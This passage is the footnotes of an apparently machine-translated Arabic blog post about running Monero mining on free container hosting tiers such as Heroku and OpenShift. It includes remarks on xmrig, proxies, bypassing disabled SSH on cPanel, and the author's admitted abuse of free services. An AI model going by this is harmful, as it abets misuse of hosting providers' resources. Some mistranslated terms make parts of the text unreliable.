افتراضات الخصوصية ، فأنا متأكد من أن معظمهم يلقي نظرة خاطفة على الداخل كلما كانت هناك مشكلة قائمة ، ولكن هذه مشكلة فقط لأوقات التشغيل القائمة على الحاوية ، في حين أن الأجهزة الافتراضية هي إلى حد كبير مربعات سوداء.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>حصل عامل التعدين المدمج في عقدة monero على بعض العمل لجعله أكثر ملاءمة للخلفية ، لكن توزيع xmrig لم يركز أبدًا على ملاءمة الخلفية.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>تقدم بعض المجمعات صعوبات مختلفة على منافذ الاتصال المختلفة ، وتميل إلى مواءمة صعوبة المهمة مع المشاركات المقدمة من عامل التعدين ، لكن دقة الوكيل كانت لا تزال أكثر ملاءمة ، لأنها ستمنع التجمع<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> اربط</a> (على الرغم من أننا لم نغير حمامات السباحة أبدًا).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>لم يكن سعيدًا عندما ظهر التكوين فجأة واختفى من نظام الملفات</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>نحن لا نتحدث عن<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> بروتوكول الطبقة</a> نظرًا لأنه يتعين علينا فقط التعامل مع كل ما يتم تنفيذه فيه<em> على حد سواء</em> المسبح وعامل المناجم ... وهو عادة الحد الأدنى ، وربما مع امتدادات غير قياسية.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>لا تذهب أبدا باش كامل :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>لم أستكشف ما يحدث عندما تقوم إحدى العمليات بتحميل وظائف إضافية في وقت التشغيل ، حيث ستبحث النواة عن العنوان في تخطيط ذاكرة الملف القابل للتنفيذ ، والذي من شأنه الوصول إلى نظام الملفات وربما يتسبب في حدوث عطل.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>الحدود تعسفية ، ووقت وحدة المعالجة المركزية أقل من ثانية ، والذاكرة أقل من 128 م ، ويتم حظر الاتصالات الصادرة.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>بقليل من الصبر ، يمكنك أيضًا تشغيل مثيل ssh كامل على بيئة تمهيدية حول مساحة حساب cpanel الخاص بك ،<em> بدون</em> الوصول إلى SSH المدمج في cpanel والذي يميل مزودي الاستضافة إلى تعطيله.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>انتقلت openhift من فئة مجانية لمدة عام واحد إلى 3 أشهر إلى شهر واحد ، وبدأت في طلب مصادقة الهاتف ، يمكنني أن أضمن أنني لست الوحيد الذي يسيء استخدام خدماتهم.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>تعتبر حاويات Heroku المجانية من الطبقة السخية للغاية من حيث الموارد ، فهي توفر 4c / 8t (افتراضية) cpus ، والكثير من ذاكرة الوصول العشوائي والتخزين الكبير (والتي لا تكون مستمرة ويتم التخلص منها عند إيقاف تشغيل dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>لقد أضافوا قواعد تسجيل أكثر صرامة ، بعد بضع حالات حظر ، ربما أكون قد ساهمت في ذلك.</table><p><div id=post-tags-list>نشر العلامات: <span class=post-tag><a href=https://www.unto.re/tag/crypto> التشفير</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> صافي</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> صدفة</a></span></div><div class=page-foot><div class=copyright>21 أغسطس 2021</div></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - بدعم من<a href=https://github.com/tlienart/Franklin.jl> فرانكلين</a></div><div class=page__footer-links>- <ul><li><a href=/ar/sitemapxml> خريطة الموقع</a></li> | <li><a href=/ar/tag> العلامات</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></footer></div>